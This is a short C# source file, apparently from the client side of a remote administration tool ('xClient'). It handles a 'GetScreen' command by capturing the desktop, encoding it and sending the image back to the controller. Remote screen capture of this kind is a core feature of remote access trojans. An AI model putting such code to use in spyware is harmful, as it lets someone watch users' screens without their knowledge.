using System;
using System.Collections.Generic;
using System.Text;
using xClient.Utils.ScreenCapture;
using xClient.responds;
using Jiraiya.commands;
using System.Drawing;
namespace xClient
{
    partial class Program
    {
        static IBcodec MyCodec = new IBcodec();
        private static void handle_SendScreen(GetScreen command)
        {
  
            Bitmap desktop = CaptureScreen.CaptureDesktop2();
            if (desktop == null) Console.WriteLine("null image");
            MyCodec.Code(desktop, command.quality);
            send_byte(resTObyte(new SendScreen(MyCodec.Blocks, MyCodec.BlocksData)));
            desktop.Dispose();

             System.GC.Collect();


        }
    }
}
